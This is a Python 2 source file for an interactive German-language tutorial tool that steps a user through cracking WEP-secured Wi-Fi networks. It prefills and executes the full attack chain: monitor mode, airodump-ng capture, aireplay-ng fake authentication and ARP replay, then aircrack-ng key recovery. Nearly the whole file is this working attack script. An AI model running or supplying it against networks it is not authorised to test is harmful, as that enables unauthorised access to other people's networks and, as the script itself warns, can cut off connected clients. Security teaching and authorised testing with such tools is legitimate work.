#!/usr/bin/python
# -*- coding: utf-8 -*-
import os
import sys
import subprocess
import time
import subprocess

import colors
import generics
from generics import rlinput,execute,clearScreen,showCAPfiles,showSKA


def WEP_Shared(wifi_name,wifi_mac,router_ssid,router_bssid,router_chn):
	print("Für das Knacken von WEP-Shared-gesicherten Netzen muss zuerst eine Deauthentication von AP vermieden werden.")
	#START MONITOR-MODE
	generics.monitor_mode(wifi_name)

	#DELETE OLD SKA-FILES
	command = rlinput('Zu Beginn müssen evtl. existierende Shared-Key-Authentication-Files gelöscht werden: \n# ', 'rm sharedkey-*')
	execute(command)

	#START AIRODUMP
	command = rlinput('Starten von airodump-ng um PRGA-File (sharedkey) anzulegen. Es muss gewartet werden bis eine Shared-Key-Authentication (SKA) aufgenommen wurde: \n# ', 'airodump-ng -c ' +router_chn + ' --bssid '+ router_bssid +' -w sharedkey ' + wifi_name)
	execute(command)

	#PERFORM SHARED KEY AUTHENTICATION
	ska= showSKA('sharedkey')
	command = rlinput('Durchführen einer Shared-Key-Fake-Authentication: \n# ', 'aireplay-ng -1 0 -e '+ router_ssid + ' -y ' + ska + ' -a ' + router_bssid + ' -h ' + wifi_mac + ' ' + wifi_name)
	execute(command)

	#STOP MONITOR MODE
	generics.stop_monitor_mode(wifi_name)

	print('Wurde die Shared-Key-Fake-Authentication erfolgreich (\"SUCCESSFUL\") beendet: \n')
	print ('1. Ja, es erfolgte eine Ausgabe von \"Association SUCCESSFUL\" \n'
		+ '2. Nein\n' )
	selection = input("Die Auswahl bitte hier eingeben und mit Enter bestätigen: ")
	if(selection==1):
		print("Nach erfolgreicher Shared-Key-Fake-Authentication kann mit dem Tutorial zum Knacken von WEP-Open-Keys fortgefahren werden. \n")
		return True
	else: 
		print("Eine Shared-Key-Fake-Authentication muss erneut durchgeführt werden. \n")
		return False
		


def WEP_Open():
	attack = True
	while(attack==True):
		clearScreen()
		shellCols = colors.ShellColors
		print shellCols.UNDERLINE + shellCols.HEADER + 'Untermenü: WEP-Passwort knacken' + shellCols.ENDC +'\n'
		print("WEP (Wired Equivalent Privacy) ist ein Standard für die Verschlüsselung und Authentifizierung von WLANs aus dem Jahr 1999. "
			+"Ziel war es, Funknetzwerke genauso sicher, wie kabelgebundene Netzwerke zu machen. Um dieses Ziel zu erreichen, bietet WEP Mechanismen "
			+"für die Authentifizierung, Verschlüsselung und Integritätsprüfung. WEP enthält grundlegende Design-Schwächen und gilt seit 2001 als geknackt."
			+"Für die Authentifizierung der Clients am Access Point sieht WEP zwei Varianten vor, die Open-System-Authentication oder die Shared-Key-"
			+"Authentication."
			+"Das nachfolgende Tutorial unterstützt beim Durchführen eines Angriffes auf einen WEP-Open-gesicherten Router. \n")
		print('Um dieses Tutorial durchzuführen müssen zuerst folgende Parameter vorgegeben werden: '
			+'\n 1. Name und MAC des WLAN-Interfaces '
			+'\n 2. Die BSSID, SSID und Kanalnummer des angegriffenen Routers/Netzwerks\n')
		
		#STEP 1
		command = rlinput('WLAN-Interfacename und MAC ermitteln mittels: \n# ', 'ifconfig')
		execute(command)
		wifi_name = raw_input("Name des WLAN-Interfaces hier angeben: ")
		wifi_mac = raw_input("Interface-MAC angeben: ")
		
		#KILL PROCESSES
		generics.kill_wifi_proc()
		
		#STEP 2
		command = rlinput('Die BSSID und Kanalnummer ermitteln (Netzwerk anhand der SSID indentifzieren): \n# ', 'airodump-ng ' +wifi_name )
		execute(command)
		router_ssid = raw_input("Bitte die Netzwerk SSID angeben: ")
		router_chn = raw_input("Bitte die Netzwerk Kanalnummer angeben: ")
		router_bssid = raw_input("Bitte die Router BSSID angeben: ")
		

		#STRIP STRINGS
		wifi_name = wifi_name.strip()
		wifi_mac = wifi_mac.strip()
		router_ssid = router_ssid.strip()
		router_chn = router_chn.strip()
		router_bssid = router_bssid.strip()

		#OVERVIEW CONFIGURATION
		print("\n")
		print shellCols.UNDERLINE + shellCols.HEADER + "Folgende Konfiguration für die Druchführung der Angriffe wurde festgehalten:" + shellCols.ENDC + '\n'
		print('WLAN-Interfacename: ' + wifi_name)
		print('WLAN-Interface-MAC: ' + wifi_mac)
		print('SSID: ' + router_ssid)
		print('Kanalnummer: ' + router_chn)
		print('BSSID: ' + router_bssid)
		print("\n")

		#RECORD TRAFFIC
		
		print("Jetzt erst beginnt der tatsächliche Angriff: \n")
		print('Wird ein WEP-Open- oder ein WEP-Shared-Netz angegriffen: \n')
		print ('1. WEP-Open \n'
			+ '2. WEP-Shared\n' )
		try:
			selection = input("Die Auswahl bitte hier eingeben und mit Enter bestätigen: ")
		except SyntaxError:
			selection=True
		if(selection==1):
			wep_open=True
		else: 
			wep_open=False

		if(wep_open==False):
			success=False
			while(success!=True):
				success=WEP_Shared(wifi_name,wifi_mac,router_ssid,router_bssid,router_chn)
		
		command = rlinput('Aufnahme des Netzwerkverkehrs (Im Hintergrund geöffnet lassen): \n# ', 'airodump-ng -c ' +router_chn +' -w ' + router_ssid + ' --bssid ' + router_bssid+ ' ' + wifi_name )
		execute(command)

		#INJECTION TEST
		command = rlinput('Überprüfung ob Netzwerk angreifbar ist. (Nach erfolgter Prüfung kann dieses Fenster geschlossen werden.): \n# ', 'aireplay-ng -9 -e ' +router_ssid +' -a ' + router_bssid +  ' ' + wifi_name )
		execute(command)

		#SEND AUTH PACKETS
		command = rlinput('Senden von authentication-Paketen, um mehr Netzwerkverkehr zu generieren (Im Hintergrund geöffnet lassen): \n# ', 'aireplay-ng -1 6 -o 1 -q 1 -e ' +router_ssid +' -a ' + router_bssid + ' -h ' + wifi_mac +' ' + wifi_name )
		execute(command)

		#CAPTURE ARP-REQ
		command = rlinput('Abfangen und erneutes übertragen von ARP-Paketen, um mehr Netzwerkverkehr zu generieren (Kann im Hintergrund geöffnet bleiben. Falls verbundene Clients nicht mehr auf Webseiten zugreifen können, sollte dieser Prozess gestoppt werden.): \n# ', 'aireplay-ng -3 -b ' +router_bssid + ' -h ' + wifi_mac +' ' + wifi_name )
		execute(command)


		#CALCULATE KEY
		print("Nun kann während die anderen Prozesse im Hintergrund laufen das Knacken des Keys angestoßen werden. Sobald genug Informationen zum Knacken des Keys vorhanden sind, wird der Prozess automatisch mit der Extrahierung beginnen.")

		#Show list of CAP-Files
		filenamestring= showCAPfiles(router_ssid)

		command = rlinput('Das WEP-Passwort kann nun mit Hilfe des aufgenommenen Verkehrs ermittelt werden. Wenn ein Key gefunden wurde wird dieser ausgegeben. Solange muss der Prozess weiter laufen: \n# ', 'aircrack-ng -b ' +router_bssid + ' ' + filenamestring )
		execute(command)

		#ReStart Networkmanager
		generics.restart_networkmanager()

		#END
		print('Ende des WEP-Tutorials erreicht! \n Bitte wählen zum Fortfahren: \n')
		print ('1. Zurück zum Menu \n'
			+ '2. Zurück zur WEP-Übersicht\n' 
			+ '0. Tutorial beenden \n')
		try:
			selection = input("Die Auswahl bitte hier eingeben und mit Enter bestätigen: ")
		except SyntaxError:
			selection=0
		if(selection==1):
			attack = False
			return True
		elif(selection==2):
			attack=True
			#Just du magic stuff. Unicorn!!
		else: 
			attack = False
			return False










	#FINISHED WEP ATTACK